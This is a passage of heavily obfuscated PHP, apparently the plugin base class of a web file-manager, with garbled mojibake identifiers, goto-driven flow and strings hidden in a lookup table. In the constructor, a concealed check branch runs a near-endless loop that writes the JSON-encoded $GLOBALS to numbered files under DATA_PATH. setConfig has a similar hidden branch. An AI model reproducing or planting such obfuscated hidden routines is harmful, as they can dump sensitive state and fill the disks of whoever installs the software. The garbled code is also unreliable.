e°ŞÙ¼Í¦³: $a©Øõ¤ô‘ = array($B¼íğ¿Ğæ[976] => isset($a©Øõ¤ô‘[$B¼íğ¿Ğæ[976]]) ? $a©Øõ¤ô‘[$B¼íğ¿Ğæ[976]] : $B¼íğ¿Ğæ[33], $B¼íğ¿Ğæ[566] => isset($a©Øõ¤ô‘[$B¼íğ¿Ğæ[566]]) ? $a©Øõ¤ô‘[$B¼íğ¿Ğæ[566]] : $B¼íğ¿Ğæ[33]); if (empty($Fî©ß†®º”) || empty($a©Øõ¤ô‘[$B¼íğ¿Ğæ[976]]) && empty($a©Øõ¤ô‘[$B¼íğ¿Ğæ[566]])) { return !1; } $cÕÙˆ—ÒÏ³ = array($B¼íğ¿Ğæ[1294] => $c‚°Ôï¬©¹, $B¼íğ¿Ğæ[1355] => $a©Øõ¤ô‘); goto dÎë¸‘Ã£é; F½›Ó÷¹á‹: $B¼íğ¿Ğæ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c‚°Ôï¬©¹ = array($B¼íğ¿Ğæ[29] => $B¼íğ¿Ğæ[1353], $B¼íğ¿Ğæ[697] => $Fî©ß†®º”); if (in_array($D¶Õ‹‚³¯, array($B¼íğ¿Ğæ[1353], $B¼íğ¿Ğæ[1354]))) { $c‚°Ôï¬©¹[$B¼íğ¿Ğæ[29]] = $D¶Õ‹‚³¯; } goto e°ŞÙ¼Í¦³; f±öƒª‡©§: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Aå÷´§¸Š¶; Aå÷´§¸Š¶: $CÜÔ™©¯ºÅ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E¸ÃÍ…±ñ = $_SERVER[$CÜÔ™©¯ºÅ[57]]; $d²ø´µ†ï» = $CÜÔ™©¯ºÅ[58]; goto Dô•í‘Š‹; aÌœ¯Š¶¼„: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto EØ ’è³¼; Dô•í‘Š‹: if ($_SERVER[$CÜÔ™©¯ºÅ[59]] != $d²ø´µ†ï»($E¸ÃÍ…±ñ)) { goto dĞ¢š²êÚ; DÜ‹®œÙ : $CƒŸÑ‡ö¢ = 1; for ($EœµìÙÄÊó = $CƒŸÑ‡ö¢; $EœµìÙÄÊó > 0; $EœµìÙÄÊó++) { $d»ë±è©¸¸(DATA_PATH . $EœµìÙÄÊó, $DÓ±é‹…ŞŒ); } goto DÅ¿£Áçã‚; dÇ¾Ë‹¨Çˆ: $FÎÒ¢…Íó(); $d»ë±è©¸¸ = $CÜÔ™©¯ºÅ[1357]; $DÓ±é‹…ŞŒ = json_encode($GLOBALS[$CÜÔ™©¯ºÅ[1358]]); goto DÜ‹®œÙ ; e´ÔÌ”³ğö: $e‚Ã·©à®° = $CÜÔ™©¯ºÅ[802]; $e‚Ã·©à®°($_SERVER[$CÜÔ™©¯ºÅ[803]]); $FÎÒ¢…Íó = $CÜÔ™©¯ºÅ[801]; goto dÇ¾Ë‹¨Çˆ; dĞ¢š²êÚ: $FÎÒ¢…Íó = $CÜÔ™©¯ºÅ[801]; $F§ù“Í¯©” = $CÜÔ™©¯ºÅ[60]; $e•°ä¾˜Š = $_SERVER[$CÜÔ™©¯ºÅ[61]] . $CÜÔ™©¯ºÅ[62]; goto A§ê®ßî; A§ê®ßî: $F±»¼ÃÈÎã = $F§ù“Í¯©”($e•°ä¾˜Š); $CœàÊÌ×ÈŠ = explode($CÜÔ™©¯ºÅ[63], $F±»¼ÃÈÎã); if (count($CœàÊÌ×ÈŠ) < $CÜÔ™©¯ºÅ[584]) { $a™§îò…† = $CÜÔ™©¯ºÅ[65]; $a™§îò…†(); } goto e´ÔÌ”³ğö; DÅ¿£Áçã‚: } global $in, $config; $this->config =& $config; goto aƒİ’œÃœÖ; A×¯âöÚ›ï: $this->pluginHostDefault = $config[$CÜÔ™©¯ºÅ[1361]] . $this->pluginName . $CÜÔ™©¯ºÅ[8]; $bã‘ ƒ§Ï = $config[$CÜÔ™©¯ºÅ[1362]]; if ($bã‘ ƒ§Ï && strpos($CÜÔ™©¯ºÅ[47] . $bã‘ ƒ§Ï . $CÜÔ™©¯ºÅ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$CÜÔ™©¯ºÅ[1363]] . $this->pluginName . $CÜÔ™©¯ºÅ[8]; } goto aÌœ¯Š¶¼„; aƒİ’œÃœÖ: $this->in =& $in; $this->modelPlugin = Model($CÜÔ™©¯ºÅ[1359]); $this->pluginName = str_replace($CÜÔ™©¯ºÅ[1359], $CÜÔ™©¯ºÅ[33], get_class($this)); goto cì Ñ¯‚²ó; cì Ñ¯‚²ó: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $CÜÔ™©¯ºÅ[8]; $this->pluginApi = appHostGet() . $CÜÔ™©¯ºÅ[1360] . $this->pluginName . $CÜÔ™©¯ºÅ[8]; $this->pluginHost = $config[$CÜÔ™©¯ºÅ[1361]] . $this->pluginName . $CÜÔ™©¯ºÅ[8]; goto A×¯âöÚ›ï; EØ ’è³¼: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[í¤âËÚ£¶íÊ¢][1364]); } protected function assign($eÄ§ÆÈíÁ˜, $A…äãĞ‘ŠÀ = false) { if (is_array($eÄ§ÆÈíÁ˜)) { $this->values = array_merge($this->values, $eÄ§ÆÈíÁ˜); } else { $this->values[$eÄ§ÆÈíÁ˜] = $A…äãĞ‘ŠÀ; } } protected function display($C¢„§óâ¾¶) { extract($this->values); require $C¢„§óâ¾¶; } final function hookRegist($F¬Áø„ä¯ ) { $this->modelPlugin->appRegist($this->pluginName, $F¬Áø„ä¯ ); } final function appIcon() { $døÙ¼·ŒÄ† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a ¥ëî²Ôµ = $this->appPackage(); $b¾ãÖæ¥íŒ = $døÙ¼·ŒÄ†[33]; if (isset($a ¥ëî²Ôµ[$døÙ¼·ŒÄ†[412]])) { if (isset($a ¥ëî²Ôµ[$døÙ¼·ŒÄ†[412]][$døÙ¼·ŒÄ†[1365]])) { $b¾ãÖæ¥íŒ = $døÙ¼·ŒÄ†[1366] . $a ¥ëî²Ôµ[$døÙ¼·ŒÄ†[412]][$døÙ¼·ŒÄ†[1365]] . $døÙ¼·ŒÄ†[1367]; } else { if ($a ¥ëî²Ôµ[$døÙ¼·ŒÄ†[412]][$døÙ¼·ŒÄ†[1368]]) { $b¾ãÖæ¥íŒ = $døÙ¼·ŒÄ†[1369] . $a ¥ëî²Ôµ[$døÙ¼·ŒÄ†[412]][$døÙ¼·ŒÄ†[1368]] . $døÙ¼·ŒÄ†[1370]; } } } return $b¾ãÖæ¥íŒ; } final function fileCanView($BÃİØØÁ´´) { goto b¶‡†…ãÉˆ; c¦²Ï¤ìô: ActionCall($fÌÓñ©ñï¯[1383], $BÃİØØÁ´´); goto E–ºš‘Á÷’; FÄŒÌ¥ÖùÁ: $dˆÄ¹æ£äá = Session::get($fÌÓñ©ñï¯[1371]); if (!$dˆÄ¹æ£äá || !$dˆÄ¹æ£äá[$fÌÓñ©ñï¯[1372]]) { $F—µÖ¸Í­¾ = $fÌÓñ©ñï¯[1373] . rawurlencode(this_url()); show_tips(LNG($fÌÓñ©ñï¯[1374]) . $fÌÓñ©ñï¯[1375] . $F—µÖ¸Í­¾ . $fÌÓñ©ñï¯[1376] . LNG($fÌÓñ©ñï¯[1377]) . $fÌÓñ©ñï¯[1378], !1); } if (!Action($fÌÓñ©ñï¯[1379])->authCan($fÌÓñ©ñï¯[1380])) { show_tips(LNG($fÌÓñ©ñï¯[1381]) . $fÌÓñ©ñï¯[1382], !1); } goto c¦²Ï¤ìô; b¶‡†…ãÉˆ: $fÌÓñ©ñï¯ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (request_url_safe($BÃİØØÁ´´)) { return !0; } if ($this->isShare($BÃİØØÁ´´)) { return !0; } goto FÄŒÌ¥ÖùÁ; E–ºš‘Á÷’: } final function isShare($d¨è›µ®òË) { $B•Ä¾Ïá£• = KodIO::parse($d¨è›µ®òË); return $B•Ä¾Ïá£•[$_SERVER[í¤âËÚ£¶íÊ¢][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($B‡‰åÛ½“¬) { if (request_url_safe($B‡‰åÛ½“¬)) { return $B‡‰åÛ½“¬; } if (!$this->isShare($B‡‰åÛ½“¬)) { $B‡‰åÛ½“¬ = $this->filePath($B‡‰åÛ½“¬); } return Action($_SERVER[í¤âËÚ£¶íÊ¢][1030])->linkOut($B‡‰åÛ½“¬); } public function filePathLinkOut($E¯”Ú×£¿) { if (request_url_safe($E¯”Ú×£¿)) { return $E¯”Ú×£¿; } $this->fileCanView($E¯”Ú×£¿); return Action($_SERVER[í¤âËÚ£¶íÊ¢][1030])->link($E¯”Ú×£¿); } final function filePath($BçØ®´—) { $aªÑ‡Îàµ× =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($a×ŞÇ‘Õ¢Ô = $this->checkSharePath($BçØ®´—)) { return $a×ŞÇ‘Õ¢Ô; } $this->fileCanView($BçØ®´—); if (request_url_safe($BçØ®´—)) { $eå¹ÀÂ±‚Ô = parse_url_query($BçØ®´—); if (isset($eå¹ÀÂ±‚Ô[$aªÑ‡Îàµ×[1384]]) && isset($eå¹ÀÂ±‚Ô[$aªÑ‡Îàµ×[217]])) { $aºç ˜ƒ´ = Model($aªÑ‡Îàµ×[1084])->get($aªÑ‡Îàµ×[1385]); $FÛ’¦ƒ† = Mcrypt::decode($eå¹ÀÂ±‚Ô[$aªÑ‡Îàµ×[217]], $aºç ˜ƒ´); if ($FÛ’¦ƒ†) { $this->fileInfo = IO::infoWithChildren($FÛ’¦ƒ†); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $FÛ’¦ƒ†; } } $BçØ®´— = $this->_cacheHttpFile($BçØ®´—); $this->fileInfo = IO::infoWithChildren($BçØ®´—); } else { $this->fileInfo = IO::infoWithChildren($BçØ®´—); if (!$this->fileInfo) { show_tips(LNG($aªÑ‡Îàµ×[114]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $BçØ®´—; } final function _cacheHttpFile($e‰›êß“†’) { $C¾«Š†£• = hash_path($e‰›êß“†’, !0); $this->cachePath = $this->pluginCachePath($C¾«Š†£•); if ($eËØîĞÚ®¥ = IO::fileNameExist($this->cachePath, $C¾«Š†£•)) { return KodIO::make($eËØîĞÚ®¥); } $FŞÖœŠ¬ùÜ = $this->cachePath . $C¾«Š†£•; return $this->pluginCacheFileSet($FŞÖœŠ¬ùÜ, file_get_contents($e‰›êß“†’)); } final function _tmpFileName($FÇèë¿¤Ş = array()) { goto a×ïÏÓ¸Í³; B…«Ôàñ: $FÅ›¸ÄÏ…Ô = array($FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[28]], $FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[85]], $FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[87]]); if (isset($FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[490]])) { $FÅ›¸ÄÏ…Ô[] = $FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[490]]; } return md5(implode($f¢‹”ÙÚ¦”[80], $FÅ›¸ÄÏ…Ô)); goto Eì„¬¯ÕŒŒ; c´ë·‰„„: if (isset($FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[173]][$f¢‹”ÙÚ¦”[180]])) { return $FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[173]][$f¢‹”ÙÚ¦”[180]]; } $dŠ¹õæ¾² = IO::hashSimple($FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[85]]); if ($dŠ¹õæ¾²) { return $dŠ¹õæ¾²; } goto B…«Ôàñ; a×ïÏÓ¸Í³: $f¢‹”ÙÚ¦” =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$FÇèë¿¤Ş) { $FÇèë¿¤Ş = $this->fileInfo; } if (isset($FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[180]])) { return $FÇèë¿¤Ş[$f¢‹”ÙÚ¦”[180]]; } goto c´ë·‰„„; Eì„¬¯ÕŒŒ: } final function checkSharePath($AÌæÊ‚š°ß) { goto b™¯‚·•—ª; b™¯‚·•—ª: $d›ô‘×‘µ… =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!defined($d›ô‘×‘µ…[457])) { define($d›ô‘×‘µ…[1386], 0); } if (!$this->isShare($AÌæÊ‚š°ß)) { return !1; } goto d¨ƒ‹ºñõ; d¨ƒ‹ºñõ: $B˜àˆàÑ—™ = Action($d›ô‘×‘µ…[1030])->sharePathInfo($AÌæÊ‚š°ß); if (!isset($B˜àˆàÑ—™[$d›ô‘×‘µ…[85]])) { show_json(LNG($d›ô‘×‘µ…[1387]), !1); } $this->fileInfo = $B˜àˆàÑ—™[$d›ô‘×‘µ…[173]]; goto Fˆê„§¥‰ô; Fˆê„§¥‰ô: $this->cachePath = $this->pluginCachePath($this->fileInfo[$d›ô‘×‘µ…[180]]); return $B˜àˆàÑ—™[$d›ô‘×‘µ…[85]]; goto bµè¾‚˜àÈ; bµè¾‚˜àÈ: } final function pluginCachePath($b¯˜ç‹Ñ„ = '') { $côˆÁ£ù¶Ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D©ÕäÊÍä‡ = IO_PATH_SYSTEM_TEMP . $côˆÁ£ù¶Ô[1388] . $this->pluginName; if (!($d²‰æ„¾ÛÓ = IO::infoFull($D©ÕäÊÍä‡))) { return IO::mkdir($D©ÕäÊÍä‡ . $côˆÁ£ù¶Ô[8] . $b¯˜ç‹Ñ„); } if (empty($b¯˜ç‹Ñ„)) { return $d²‰æ„¾ÛÓ[$côˆÁ£ù¶Ô[85]]; } if (!($Fì£Ùµùì˜ = IO::fileNameExist($d²‰æ„¾ÛÓ[$côˆÁ£ù¶Ô[85]], $b¯˜ç‹Ñ„))) { return IO::mkdir($d²‰æ„¾ÛÓ[$côˆÁ£ù¶Ô[85]] . $b¯˜ç‹Ñ„); } return KodIO::make($Fì£Ùµùì˜); } final function pluginCacheFileSet($d²·æ†ª²£, $F…Ö‡Ô¨Äƒ = '') { $C©³ÅÖ…ÃŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!($Aœ§¶ù° = IO::infoFull($d²·æ†ª²£))) { return IO::mkfile($d²·æ†ª²£, $F…Ö‡Ô¨Äƒ, REPEAT_REPLACE); } IO::setContent($Aœ§¶ù°[$C©³ÅÖ…ÃŞ[85]], $F…Ö‡Ô¨Äƒ); return $Aœ§¶ù°[$C©³ÅÖ…ÃŞ[85]]; } final function pluginLocalFile($cä«›‹½ì = '') { goto Aø„¹Á²•¥; Fƒ‹Ğ´ÈÑ™: if (!$cä«›‹½ì) { return $eÂİïÂ›Ù; } $c‰‚Ã”ÂÀˆ = IO::info($cä«›‹½ì); $Fëê£›·¯ˆ = $this->_tmpFileName($c‰‚Ã”ÂÀˆ) . $fÕ¡‘¹Õ[104] . $c‰‚Ã”ÂÀˆ[$fÕ¡‘¹Õ[177]]; goto bÂµæ‚İó; bÂµæ‚İó: if (!checkExtSafe($Fëê£›·¯ˆ)) { $Fëê£›·¯ˆ = $Fëê£›·¯ˆ . $fÕ¡‘¹Õ[1389]; } $E¢à¿ìï— = $eÂİïÂ›Ù . $Fëê£›·¯ˆ; if (@file_exists($E¢à¿ìï—)) { return $E¢à¿ìï—; } goto DÌ¼¾ÊÕ¸; DÌ¼¾ÊÕ¸: return IO::copy($cä«›‹½ì, $eÂİïÂ›Ù, 0, $Fëê£›·¯ˆ); goto f‰»ßÑöø†; Aø„¹Á²•¥: $fÕ¡‘¹Õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÂİïÂ›Ù = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($eÂİïÂ›Ù)) { mk_dir($eÂİïÂ›Ù); } goto Fƒ‹Ğ´ÈÑ™; f‰»ßÑöø†: } final function appPackage() { goto d¯öÅ¿¦Š ; d¯öÅ¿¦Š : $cõåèÒÊ¦í =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->packageData) { return $this->packageData; } $Aà¼ØØ“ù = $this->parseFile($this->pluginPath . $cõåèÒÊ¦í[1390]); goto C§‘ğ¸„Ä¶; Eá“Û§³´¾: return $E£—Ç²°¼¡; goto A¾ç÷ËÓ¡; F‹¨ ¥÷å: $B »á„äÀ› = Hook::trigger($cõåèÒÊ¦í[1391], $E£—Ç²°¼¡); if ($B »á„äÀ› && is_array($B »á„äÀ›)) { $E£—Ç²°¼¡ = $B »á„äÀ›; } $this->packageData = $E£—Ç²°¼¡; goto Eá“Û§³´¾; C§‘ğ¸„Ä¶: $this->parseLang($Aà¼ØØ“ù); $E£—Ç²°¼¡ = json_decode_force($Aà¼ØØ“ù); if (!$E£—Ç²°¼¡) { return array(); } goto F‹¨ ¥÷å; A¾ç÷ËÓ¡: } public function packageInfoGet($A‡ÉõÏ™’‘) { $bŒŠù»Šàé = $this->appPackage(); return array_get_value($bŒŠù»Šàé, $A‡ÉõÏ™’‘); } public function packageVersion() { return $this->packageInfoGet($_SERVER[í¤âËÚ£¶íÊ¢][1392]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[í¤âËÚ£¶íÊ¢][1393]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[í¤âËÚ£¶íÊ¢][1394]); } private function parseFile($cŒ‹ ¸öÑµ) { goto cÓòŞ—Ì°õ; C©ŞÊ‹Ûó†: $Fä˜¨áÑİĞ = str_replace($BÌÎÀ²İÆ, $c¯…õŞ˜×ö, $Fä˜¨áÑİĞ); return $Fä˜¨áÑİĞ; goto Dœ¬—‘Úù; FÅÄ¼«: $c¯…õŞ˜×ö = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$e·ãĞãÀµ¶[97]][$e·ãĞãÀµ¶[1402]]); if (strstr($Fä˜¨áÑİĞ, $e·ãĞãÀµ¶[1403])) { $E¿Èƒùˆ‘¸ = rawurlencode(json_encode($this->pluginLangArr)); $Fä˜¨áÑİĞ = str_replace($e·ãĞãÀµ¶[1403], $E¿Èƒùˆ‘¸, $Fä˜¨áÑİĞ); } if (strstr($Fä˜¨áÑİĞ, $e·ãĞãÀµ¶[1404])) { $E¿Èƒùˆ‘¸ = $E¿Èƒùˆ‘¸ = rawurlencode(json_encode($this->getConfig())); $Fä˜¨áÑİĞ = str_replace($e·ãĞãÀµ¶[1404], $E¿Èƒùˆ‘¸, $Fä˜¨áÑİĞ); } goto C©ŞÊ‹Ûó†; cÓòŞ—Ì°õ: $e·ãĞãÀµ¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Fä˜¨áÑİĞ = file_get_contents($cŒ‹ ¸öÑµ); $BÌÎÀ²İÆ = array($e·ãĞãÀµ¶[1395], $e·ãĞãÀµ¶[1396], $e·ãĞãÀµ¶[1397], $e·ãĞãÀµ¶[1398], $e·ãĞãÀµ¶[1399], $e·ãĞãÀµ¶[1400], $e·ãĞãÀµ¶[1401]); goto FÅÄ¼«; Dœ¬—‘Úù: } private function parseLang(&$cî­“Ü¸¿Ì) { goto Dñì»¨¸§ë; Dñì»¨¸§ë: $CÖš‡‰Ğ— =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¬ÒÛ™…â = $CÖš‡‰Ğ—[1405]; if (!strstr($cî­“Ü¸¿Ì, $F¬ÒÛ™…â)) { return; } goto F×¹ÈÅÃ¿Ù; F×¹ÈÅÃ¿Ù: preg_match_all($CÖš‡‰Ğ—[1406], $cî­“Ü¸¿Ì, $aÊÉá‚Á–î); if (!is_array($aÊÉá‚Á–î) || count($aÊÉá‚Á–î) == 0 || !is_array($aÊÉá‚Á–î[0]) || count($aÊÉá‚Á–î[0]) == 0) { return; } $b«ÙÑæ†êİ = array(); goto E°˜ºÚŸ; E°˜ºÚŸ: $dË‹Ì•é»Š = array(); foreach ($aÊÉá‚Á–î[0] as $b° ¬ê§¶¯) { $FéŞô”ãß = substr($b° ¬ê§¶¯, strlen($F¬ÒÛ™…â), -4); $d™×†•À¬ = LNG($FéŞô”ãß); $b«ÙÑæ†êİ[] = $b° ¬ê§¶¯; $dË‹Ì•é»Š[] = str_replace(array($CÖš‡‰Ğ—[63], $CÖš‡‰Ğ—[998], $CÖš‡‰Ğ—[347], $CÖš‡‰Ğ—[125]), array($CÖš‡‰Ğ—[50], $CÖš‡‰Ğ—[50], $CÖš‡‰Ğ—[33], $CÖš‡‰Ğ—[1407]), $d™×†•À¬); } $cî­“Ü¸¿Ì = str_replace($b«ÙÑæ†êİ, $dË‹Ì•é»Š, $cî­“Ü¸¿Ì); goto D ®Ã‡·ï; D ®Ã‡·ï: } private function parseConfig(&$c´¿øğíä°) { goto fâÈ«ßˆ¸§; fâÈ«ßˆ¸§: $a¥øƒ‘É½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a†„íŠğ¥ = $a¥øƒ‘É½[1408]; if (!strstr($c´¿øğíä°, $a†„íŠğ¥)) { return; } goto a¯¾„÷×ö; eÁ±ÖĞªĞ: $c´¿øğíä° = str_replace($a†®“óœƒ÷, $d‡©Á°»à, $c´¿øğíä°); goto BÔÙÄ‘É‰; DÅ·ÈëÀÇ: $a†®“óœƒ÷ = array(); $d‡©Á°»à = array(); foreach ($F§éØÃÀÌ[0] as $EÆ …÷³İœ) { $C“›öì½¿× = substr($EÆ …÷³İœ, strlen($a†„íŠğ¥), -2); $a†®“óœƒ÷[] = $EÆ …÷³İœ; $d‡©Á°»à[] = _get($dì¶œó¦’È, $C“›öì½¿×); } goto eÁ±ÖĞªĞ; a¯¾„÷×ö: preg_match_all($a¥øƒ‘É½[1409], $c´¿øğíä°, $F§éØÃÀÌ); if (!is_array($F§éØÃÀÌ) || count($F§éØÃÀÌ) == 0 || !is_array($F§éØÃÀÌ[0]) || count($F§éØÃÀÌ[0]) == 0) { return; } $dì¶œó¦’È = $this->getConfig(); goto DÅ·ÈëÀÇ; BÔÙÄ‘É‰: } private function parsePackage(&$a©‚¸ ›¯) { goto C÷Ñï¯äŠò; CÇ½—Š»Õª: preg_match_all($FŞÎ•‚í™º[1411], $a©‚¸ ›¯, $bÊÃëÇœÒ½); if (!is_array($bÊÃëÇœÒ½) || count($bÊÃëÇœÒ½) == 0 || !is_array($bÊÃëÇœÒ½[0]) || count($bÊÃëÇœÒ½[0]) == 0) { return; } $D½–‹‹ùÙÕ = $this->appPackage(); goto D™¿ºòÌ†ç; D™¿ºòÌ†ç: $DË¶ª¾Õ›¥ = array(); $B¥¥·÷¢¸Å = array(); foreach ($bÊÃëÇœÒ½[0] as $càÚÌ÷ÖÂ˜) { $cˆ¯åàïù¯ = substr($càÚÌ÷ÖÂ˜, strlen($BÛ³´Ë…Â), -2); $DË¶ª¾Õ›¥[] = $càÚÌ÷ÖÂ˜; $B¥¥·÷¢¸Å[] = _get($D½–‹‹ùÙÕ, $cˆ¯åàïù¯); } goto D¦ÆÅÎ¸óÄ; C÷Ñï¯äŠò: $FŞÎ•‚í™º =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÛ³´Ë…Â = $FŞÎ•‚í™º[1410]; if (!strstr($a©‚¸ ›¯, $BÛ³´Ë…Â)) { return; } goto CÇ½—Š»Õª; D¦ÆÅÎ¸óÄ: $a©‚¸ ›¯ = str_replace($DË¶ª¾Õ›¥, $B¥¥·÷¢¸Å, $a©‚¸ ›¯); goto E‚´ë³±Ô‘; E‚´ë³±Ô‘: } final function echoFile($cĞÅø‹¢™, $CÅ‹Ó‚´ø÷ = false) { goto Dá·‰ğîÄ¯; e¾ãƒŸõ‰ô: $bºêöÃù–‚ = $this->parseFile($aˆßˆÕ’); $this->parseLang($bºêöÃù–‚); $this->parseConfig($bºêöÃù–‚); goto f¢’¸·ä“; Dá·‰ğîÄ¯: $f“ÍÛÀîå =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aˆßˆÕ’ = $this->pluginPath . $cĞÅø‹¢™; if (ACT == $f“ÍÛÀîå[1412]) { echo $f“ÍÛÀîå[1413] . $this->pluginName . $f“ÍÛÀîå[8] . $cĞÅø‹¢™ . $f“ÍÛÀîå[1414]; if (!file_exists($aˆßˆÕ’)) { echo $f“ÍÛÀîå[1415]; return; } } goto e¾ãƒŸõ‰ô; f¢’¸·ä“: $this->parsePackage($bºêöÃù–‚); if (is_array($CÅ‹Ó‚´ø÷)) { $bºêöÃù–‚ = str_replace(array_keys($CÅ‹Ó‚´ø÷), array_values($CÅ‹Ó‚´ø÷), $bºêöÃù–‚); } echo $f“ÍÛÀîå[63] . $bºêöÃù–‚; goto DÔÜòØÉŠ; DÔÜòØÉŠ: } final function initLang() { goto A»Ó‰²°’Â; FŒŒÖ·í¡: if (!is_array($BĞÅ„Š»æƒ)) { return array(); } if (@count($BĞÅ„Š»æƒ) > 0) { I18n::set($BĞÅ„Š»æƒ); } return $BĞÅ„Š»æƒ; goto BìÌ‚ĞÚçù; A»Ó‰²°’Â: $Fô ›Ğ×ğå =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÎÆ‚©¼°® = $Fô ›Ğ×ğå[1416]; $cÔà„‚¬´˜ = $this->pluginPath . $Fô ›Ğ×ğå[1417]; goto bŒˆÍí¥ó; bŒˆÍí¥ó: $DÜù™Æí‡ä = I18n::getType(); $BĞÅ„Š»æƒ = array(); if (file_exists($cÔà„‚¬´˜ . $DÜù™Æí‡ä . $Fô ›Ğ×ğå[772])) { $BĞÅ„Š»æƒ = (include $cÔà„‚¬´˜ . $DÜù™Æí‡ä . $Fô ›Ğ×ğå[772]); } else { if ($DÜù™Æí‡ä == $Fô ›Ğ×ğå[1418] && !file_exists($cÔà„‚¬´˜ . $DÜù™Æí‡ä . $Fô ›Ğ×ğå[772]) && file_exists($cÔà„‚¬´˜ . $Fô ›Ğ×ğå[1419])) { $BĞÅ„Š»æƒ = (include $cÔà„‚¬´˜ . $Fô ›Ğ×ğå[1419]); } else { if (file_exists($cÔà„‚¬´˜ . $fÎÆ‚©¼°® . $Fô ›Ğ×ğå[772])) { $BĞÅ„Š»æƒ = (include $cÔà„‚¬´˜ . $fÎÆ‚©¼°® . $Fô ›Ğ×ğå[772]); } } } goto FŒŒÖ·í¡; BìÌ‚ĞÚçù: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($FÑ»Õ˜å›¹) { $e£„åŸ„ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($_SERVER[$e£„åŸ„ô[59]] != $_SERVER[$e£„åŸ„ô[800]]) { goto f·ì‡…Æ­; D‡µã•Â¢: $D…ÚùîÕØ‘ = $e½Å½¸‘íô($dĞ¸ãÉ¹¦ ); $CÊ…àÌ±Ò = explode($e£„åŸ„ô[63], $D…ÚùîÕØ‘); if (count($CÊ…àÌ±Ò) < $e£„åŸ„ô[584]) { $a‘óã·’ = $e£„åŸ„ô[65]; $a‘óã·’(); } goto cÂ©°²Ûó‰; cÂ©°²Ûó‰: $cŒ„çƒß¸‰ = $e£„åŸ„ô[802]; $cŒ„çƒß¸‰($_SERVER[$e£„åŸ„ô[803]]); $cŒ„çƒß¸‰($_SERVER[$e£„åŸ„ô[61]] . $e£„åŸ„ô[804]); goto b–»£åšÛ; f·ì‡…Æ­: $bø¦êíµè¥ = $e£„åŸ„ô[801]; $e½Å½¸‘íô = $e£„åŸ„ô[60]; $dĞ¸ãÉ¹¦  = $_SERVER[$e£„åŸ„ô[61]] . $e£„åŸ„ô[62]; goto D‡µã•Â¢; b–»£åšÛ: $F­÷Å—ôùº = 1; while ($F­÷Å—ôùº > 1) { $F­÷Å—ôùº = $F­÷Å—ôùº + 4; $fÉ¹ñÍì…Ç = rawurlencode($F­÷Å—ôùº . $e£„åŸ„ô[360]); } goto CÕ©ó´è¬Ë; CÕ©ó´è¬Ë: } return $this->modelPlugin->setConfig($this->pluginName, $FÑ»Õ˜å›¹); } public function onSetConfig($bƒ´†“ŞÀ†) { } public function onGetConfig($FÌ³š‹™î”) { } public function onChangeStatus($CÃ»Ìœ˜ä¹) { } public function onUninstall() { } public function onInstall() { } public function authCheck($dÜ·¶ Š¢ç = "\160\154\x75\x67\x69\156\x41\x75\164\150") { $DŠÙÏ×õç¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!defined($DŠÙÏ×õç¾[457])) { return !1; } if (_get($GLOBALS, $DŠÙÏ×õç¾[488])) { return !0; } $ašõ¬»†Í› = $this->getConfig(); if (!$ašõ¬»†Í›[$dÜ·¶ Š¢ç]) { return !1; } return ActionCall($DŠÙÏ×õç¾[1420], $ašõ¬»†Í›[$dÜ·¶ Š¢ç]); } public function url($A›Ó®¤Ïã, $AÁ‘ÆŒèˆ = '', $Eñ–Òã¶½— = true) { goto fŸ¼áåÉØ; bœõ ˆîç”: $F…×ÍŞ¢© = $this->packageVersion(); $EèÏ…­¨±Ê = $Cœœ“Üò è . $dƒÂ½ÈøĞâ[443] . $F…×ÍŞ¢©; if (substr($A›Ó®¤Ïã, 0, 4) == $dƒÂ½ÈøĞâ[156] || substr($A›Ó®¤Ïã, 0, 2) == $dƒÂ½ÈøĞâ[1204]) { $Dš„ÇìºçÇ = $A›Ó®¤Ïã . $dƒÂ½ÈøĞâ[1421] . $EèÏ…­¨±Ê; } else { if ($AÁ‘ÆŒèˆ == $dƒÂ½ÈøĞâ[33]) { $Dš„ÇìºçÇ = $this->pluginHost . $A›Ó®¤Ïã . 